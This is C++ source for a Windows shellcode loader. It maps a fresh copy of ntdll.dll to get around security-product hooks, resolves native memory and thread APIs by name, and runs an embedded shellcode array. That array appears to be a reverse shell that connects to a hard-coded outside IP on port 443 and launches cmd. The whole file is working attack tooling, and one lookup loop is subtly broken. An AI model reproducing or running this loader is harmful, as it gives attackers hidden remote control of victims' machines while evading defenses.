#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include "unhookingData.h"
#include "unhookDLL.h"
#include <iostream>

#pragma comment(lib, "ntdll")

#define NtCurrentProcess() ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xcf\x94\x43\x6b"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


SIZE_T shellcodeSize = sizeof(shellcode);

PVOID BaseAddress = NULL;
DWORD OldProtect = 0;
HANDLE hHostThread = INVALID_HANDLE_VALUE;

void UnhookDLLLoading() {

    // Open DLL file and read it into memory
    HANDLE hFile = CreateFileA("C:\\Users\\ethic\\Desktop\\Hacktivity\\Windows Exploit\\Resources\\ntdll.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open DLL file." << std::endl;
        return;
    }
    // Get the file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size" << std::endl;
        CloseHandle(hFile);
        return;
    }

    // Allocate buffer
    char* dllBytes = (char*)malloc(fileSize);
    if (dllBytes == nullptr) {
        std::cerr << "Failed to allocate memory" << std::endl;
        CloseHandle(hFile);
        return;
    }

    // Read the file into memory
    DWORD bytesRead;
    if (!ReadFile(hFile, dllBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "Failed to read file into memory" << std::endl;
        free(dllBytes);
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);

    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);

    //loading the all sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }
    // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)((DWORD64)IMPORT_DATA->Name + (DWORD64)alloc_mem);
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }

    // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);
    DWORD OldProtect = 0;
    VirtualProtect(alloc_mem, fileSize, PAGE_EXECUTE_READ, &OldProtect);

    printf("[+] Successfully Mapped ntdll @ %p\n", alloc_mem);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
    for (unsigned int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);

        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
            pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

    if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            return;
        }
        printf("\n[+] RW Virtual Memory Successfully Allocated @ %p\n", pNtAllocateVirtualMemory);
    }

    memcpy(BaseAddress, shellcode, shellcodeSize);

    printf("[+] Successfully Wrote the Shellocode into allocated Memory !!!\n");
    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (unsigned int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            return;
        }
        printf("\n[+] Changed the permission of memory from RW to RX @ %p\n", pNtProtectVirtualMemory);
    }

    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;

    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };

    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        // Calculate the address of the function name
        char* name = (char*)((DWORD_PTR)alloc_mem + *(DWORD_PTR*)addrNames3++);

        // Compare the name with the target function
        if (strcmp(name, NtCreateThreadExtxt) != NULL) {
            // Resolve the function address
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD_PTR)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }
    }

    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            return;
        }
        printf("\n[+] Executed Shellcode............!!! @ %p\n", pNtCreateThreadEx);
    } else {
        printf("NtCreateThreadEx resolved at: %p\n", pNtCreateThreadEx);
    }
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;

    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in NtWa1tF0rS1ngle0bj3ct (%u)\n", GetLastError());
        return;
    }

    printf("\n\n[+] Work has been Done!!!!\n");

    VirtualProtect(alloc_mem, fileSize, PAGE_READONLY, &OldProtect);
    printf("\n\n[+] Changed the permission of allocated region to R before quitting!!!!\n");
}